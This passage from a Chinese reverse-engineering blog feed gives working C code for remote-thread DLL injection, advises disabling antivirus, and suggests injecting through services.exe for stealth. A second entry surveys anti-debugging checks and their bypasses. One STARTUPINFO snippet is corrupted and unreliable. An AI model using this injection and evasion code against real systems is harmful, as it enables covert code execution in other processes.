class="line"><span class="params">  [in]           SIZE_T dwSize,<span class="comment">//内存大小</span></span></span><br><span class="line"><span class="params">  [in]           DWORD  flAllocationType,<span class="comment">//MEM_COMMIT</span></span></span><br><span class="line"><span class="params">  [in]           DWORD  flProtect<span class="comment">//PAGE_EXECUTE_READWRITE</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="写入内存空间"><a href="#写入内存空间" class="headerlink" title="写入内存空间"></a>写入内存空间</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果该函数成功，则返回值为非零值</span></span><br><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE  hProcess,<span class="comment">//目标进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  LPVOID  lpBaseAddress,<span class="comment">//分配到的内存首地址</span></span></span><br><span class="line"><span class="params">  [in]  LPCVOID lpBuffer,<span class="comment">//写入的内容</span></span></span><br><span class="line"><span class="params">  [in]  SIZE_T  nSize,<span class="comment">//写入的大小</span></span></span><br><span class="line"><span class="params">  [out] SIZE_T  *lpNumberOfBytesWritten<span class="comment">//NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="创建远程线程"><a href="#创建远程线程" class="headerlink" title="创建远程线程"></a>创建远程线程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE                 hProcess,<span class="comment">//要在其中创建线程的进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<span class="comment">//NULL</span></span></span><br><span class="line"><span class="params">  [in]  SIZE_T                 dwStackSize,<span class="comment">//0</span></span></span><br><span class="line"><span class="params">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//回调函数</span></span></span><br><span class="line"><span class="params">  [in]  LPVOID                 lpParameter,<span class="comment">//分配的内存空间</span></span></span><br><span class="line"><span class="params">  [in]  DWORD                  dwCreationFlags,<span class="comment">//0</span></span></span><br><span class="line"><span class="params">  [out] LPDWORD                lpThreadId<span class="comment">//NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>这里获取进程pid偷懒了，是直接在任务管理器中查看的。如果想实现自动获取，可以通过进程遍历来实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//进程标识符</span></span><br><span class="line">DWORD pid = <span class="number">32064</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值为目标进程句柄</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取LoadLibary函数的加载地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//返回值是Kernel32的句柄（也可以用GetModuleHandle实现）</span></span><br><span class="line">HMODULE hMod = LoadLibrary(<span class="string">&quot;Kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="comment">//返回LoadLibraryA的地址</span></span><br><span class="line">FARPROC fun = GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="comment">//此路径修改为你自己的测试dll</span></span><br><span class="line"><span class="type">char</span> DllPath[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在目标进程中开辟内存空间</span></span><br><span class="line">LPVOID address = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(DllPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将要注入的dll路径写入目标进程</span></span><br><span class="line">WriteProcessMemory(hProcess, address, DllPath, <span class="built_in">strlen</span>(DllPath), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//目标程序创建线程</span></span><br><span class="line">CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)fun, address, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先开启测试注入进程</p><p><img src="https://s2.loli.net/2024/04/28/SOsGKEf541hWxnD.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/SOsGKEf541hWxnD.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428114954519"></p><p>接着运行Dll注入进程，记得关闭杀毒软件</p><p><img src="https://s2.loli.net/2024/04/28/V57KYZPMU39JRzN.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/V57KYZPMU39JRzN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428115046164"></p><p>在注入进程也可以找到我们的Dll</p><p><img src="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428115112808"></p><h2 id="进阶实现"><a href="#进阶实现" class="headerlink" title="进阶实现"></a>进阶实现</h2><p>我们可以依赖可信任进程进行注入，例如注入<code>Services.exe</code>这个进程，首先先将a.dll远线程注入到Service.exe中，再利用a.dll将b.dll远线程注入的待注入进程中。</p><p>这里偷一张图</p><p><img src="https://img-blog.csdn.net/20140206234556328" class="lazyload" data-srcset="https://img-blog.csdn.net/20140206234556328" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>a.dll注入成功后还可以“功成身退”，利用<code>FreeLibraryAndExitThread()</code>把自己卸载掉并且退出线程。</p>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反调试跟踪与反反调试</title>
      <link href="/2022/10/12/%E5%8F%8D%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95/"/>
      <url>/2022/10/12/%E5%8F%8D%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>来总结一下学过的反调试技术。</p><span id="more"></span><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><h3 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent()"></a>IsDebuggerPresent()</h3><p>相信学习反调试都是从这个函数入手的，这个函数会查询进程环境块(PEB)中的<code>IsDebugged</code>标志。如果进程没有运行在调试器环境中，函数返回0；如果调试附加了进程，函数返回一个非零值。</p><p>实际上调用<code>IsDebuggerPresent()</code>会检查PEB结构体中偏移为0x2的<code>BeingDebugge</code>标志位，用来表示进程是否处于被调试状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> IsDebuggerPresent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess()"></a>NtQueryInformationProcess()</h3><p>我们只需要关注这个函数的第二个参数即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> debugPort = <span class="number">0</span>;</span><br><span class="line">HMODULE hModule = LoadLibrary(<span class="string">&quot;Ntdll.dll&quot;</span>);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">    <span class="comment">//如果进程正在被调试，则返回调试端口，否则返回0</span></span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), <span class="number">0x7</span>, &amp;debugPort, <span class="keyword">sizeof</span>(debugPort), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> debugPort != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再提一嘴<code>CheckRemoteDebuggerPresen</code>这个API，它再往下调用也会用到<code>NtQueryInformationProcess</code>，所以两者绕过可以是一样的。</p><h3 id="NtGlobalFlags"><a href="#NtGlobalFlags" class="headerlink" title="NtGlobalFlags"></a>NtGlobalFlags</h3><p>由于调试器中启动进程与正常模式下启动进程有些不同，所以它们创建内存堆的方式也不同。系统使用PEB结构偏移量0x68处的<code>NtGlobalFlags</code>，来决定如何创建堆结构。如果这个位置的值为0x70，我们就知道进程正运行在调试器中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">int result = 0;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs:[30h]</span><br><span class="line">mov eax, [eax + 68h]</span><br><span class="line">and eax, 0x70</span><br><span class="line">mov result, eax</span><br><span class="line">&#125;</span><br><span class="line">return result != 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TEB结构体中还有很多指向堆的标志位可以来判断是否存在调试器环境下，有兴趣可以看这篇文章<a href="https://cloud.tencent.com/developer/article/1471373">26种对付反调试的方法 -腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h3 id="STARTUPINFO"><a href="#STARTUPINFO" class="headerlink" title="STARTUPINFO"></a>STARTUPINFO</h3><p>双击启动程序时，实际是通过CreateProcess函数创建启动的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcessA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]                BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  [in]                DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="line"><span class="params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>我们关注倒数第二个参数就可以，<code>A</code>表示Ascii码。explorer启动程序时，会把倒数第2个参数STARTUPINFO结构体中的值设置为0，但调试器启动程序的时候不会，所以我们可以通过判断该结构体中的某些值是否为0来判断是否被调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">  DWORD  cb;</span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure><p>我们选择几个属性来进行反调试检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> CheckDebug <span class="title function_">STARTUPINFO</span><span class="params">()</span>&#123;</span><br><span class="line">STARTUPINFO si =&#123;&#125;;</span><br><span class="line">GetStartupInfol(&amp;si);</span><br><span class="line"><span class="keyword">if</span> (si.dw||si.dwy||si.dwXSize||si.dwYSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x %x n&quot;</span>,si.dwy,si.dwy,si.dwrsize,si.dwysize):</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;.</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以选择修改函数返回值来绕过。</p><h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>这里就是查找调试器的特征值，如果找到就退出</p><h3 id="窗口检测"><a href="#窗口检测" class="headerlink" title="窗口检测"></a>窗口检测</h3><p>查找当前系统中运行的程序窗口名称是否包含敏感程序来进行反调试。常用的函数有FindWindow、EnumWindows。FindWindow可以查找符合指定类名或窗口名的窗口句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (FindWindowA(<span class="string">&quot;OLLYDBG&quot;</span>, <span class="literal">NULL</span>)!=<span class="literal">NULL</span> || FindWindowA(<span class="string">&quot;WinDbgFrameClass&quot;</span>, <span class="literal">NULL</span>)!=<span class="literal">NULL</span> || FindWindowA(<span class="string">&quot;QWidget&quot;</span>, <span class="literal">NULL</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过可以可以使用插件来隐藏窗口，或者为调试器改名。</p><h3 id="进程检测"><a href="#进程检测" class="headerlink" title="进程检测"></a>进程检测</h3><p>遍历系统所有进程，如果存在调试器就退出。</p><p>实现方法很简单，获取系统中所有进程的快照，接着一一对比就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD ID;</span><br><span class="line">DWORD ret = <span class="number">0</span>;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe32.dwSize = <span class="keyword">sizeof</span>(pe32); </span><br><span class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(hProcessSnap == INVALID_HANDLE_VALUE) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> FALSE; </span><br><span class="line">&#125;</span><br><span class="line">BOOL bMore = Process32First(hProcessSnap, &amp;pe32); </span><br><span class="line"><span class="keyword">while</span>(bMore)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stricmp(pe32.szExeFile, <span class="string">&quot;OllyDBG.EXE&quot;</span>)==<span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;OllyICE.exe&quot;</span>)==<span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;x64_dbg.exe&quot;</span>)==<span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;windbg.exe&quot;</span>)==<span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;ImmunityDebugger.exe&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">bMore = Process32Next(hProcessSnap, &amp;pe32); </span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hProcessSnap); </span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调试器行为"><a href="#调试器行为" class="headerlink" title="调试器行为"></a>调试器行为</h2><p>正常运行程序时不会有下断点这个操作，会被当成异常去处理。只有使用调试器时才会有下断点的操作，本质上是修改运行的进程中的代码，在调试器中运行和直接运行在细节上会有一些不同，因此可以检测出调试器的存在。</p><h3 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h3><p>这里检查软件断点有两种思路。一种是检查自己的缓冲区是否出现了0xcc这个机器码，另外一种就是crc检验，查看自己的代码是否被修改了。</p><p>下面贴出两种思路的实现方式和绕过</p><p>检查字节码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS32 pNtHeaders;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line">DWORD dwBaseImage = (DWORD)GetModuleHandle(<span class="literal">NULL</span>); </span><br><span class="line">pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;</span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="keyword">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER) + </span><br><span class="line"> (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage; </span><br><span class="line">DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;    </span><br><span class="line">BOOL Found = FALSE;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">cld             </span><br><span class="line">mov     edi,dwAddr</span><br><span class="line">mov     ecx,dwCodeSize</span><br><span class="line">mov     al,<span class="number">0</span>CCH </span><br><span class="line">repne   scasb</span><br><span class="line">jnz     NotFound</span><br><span class="line">mov Found,<span class="number">1</span></span><br><span class="line">NotFound:         </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查crc校验码（需要提前计算好）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">CalcFuncCrc</span><span class="params">(PUCHAR funcBegin, PUCHAR funcEnd)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD crc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; funcBegin &lt; funcEnd; ++funcBegin)</span><br><span class="line">    &#123;</span><br><span class="line">        crc += *funcBegin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> crc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> auto_inline(off)</span></span><br><span class="line">VOID <span class="title function_">DebuggeeFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> calc = <span class="number">0</span>;</span><br><span class="line">    calc += <span class="number">2</span>;</span><br><span class="line">    calc &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">    calc -= <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">DebuggeeFunctionEnd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> auto_inline(on)</span></span><br><span class="line">DWORD g_origCrc = <span class="number">0x2bd0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD crc = CalcFuncCrc((PUCHAR)DebuggeeFunction, (PUCHAR)DebuggeeFunctionEnd);</span><br><span class="line">    <span class="keyword">if</span> (g_origCrc != crc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stop debugging program!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这两种技术来说，都不是很好绕过。对于通用的方法，我觉得可以在程序中的汇编指令的判断语句中打补丁更改跳转条件去绕过。对于crc校验码，可以修改计算cec的返回值，或者修改全局变量与返回值相等。</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>在Windows x86架构中，开发人员在检查和调试代码时使用了一组调试寄存器。这些寄存器允许在访问内存读取或写入时中断程序执行并将控制传输到调试器。</p><ol><li>DR0-DR3 -断点寄存器</li><li>DR4，DR5 -储藏</li><li>DR6 -调试状态</li><li>DR7 – 调试控制</li></ol><p>所以同时最多只能设置4个硬件断点，如果没有硬件断点，那么DR0、DR1、DR2、DR3这4个寄存器的值都为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">CONTEXT context;  </span><br><span class="line">    HANDLE hThread = GetCurrentThread();  </span><br><span class="line">    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;  </span><br><span class="line">    GetThreadContext(hThread, &amp;context);  </span><br><span class="line">    <span class="keyword">if</span> (context.Dr0 != <span class="number">0</span> || context.Dr1 != <span class="number">0</span> || context.Dr2 != <span class="number">0</span> || context.Dr3!=<span class="number">0</span>)   </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> TRUE;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> FALSE;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这也只有设置硬件断点才会被检查出来。</p><h3 id="时钟检测"><a href="#时钟检测" class="headerlink" title="时钟检测"></a>时钟检测</h3><p>当程序自己运行没有附件调试器时，肯定做什么都直接快速，而不像调试器一样跑一条动一条。时钟检测技术就是通过计算关键内容运行时间差异来判断进程是否处于被调试状态。同时程序在虚拟机中的运行速度也比正常速度慢，所以时钟检测技术一般也用于反虚拟机&#x2F;反模拟器技术。计算运行时差的方式一般有两种：读取CPU时钟计数器、时间计数相关API。</p><p>CPU计数器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bool CheckDebug_RDTSC()&#123;</span><br><span class="line">int64t t1=0,t2=0;</span><br><span class="line">int lo=0,hi=0;</span><br><span class="line">__asm&#123;</span><br><span class="line">rdtsc</span><br><span class="line">mov [lo],eax</span><br><span class="line">mov[hi],edx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 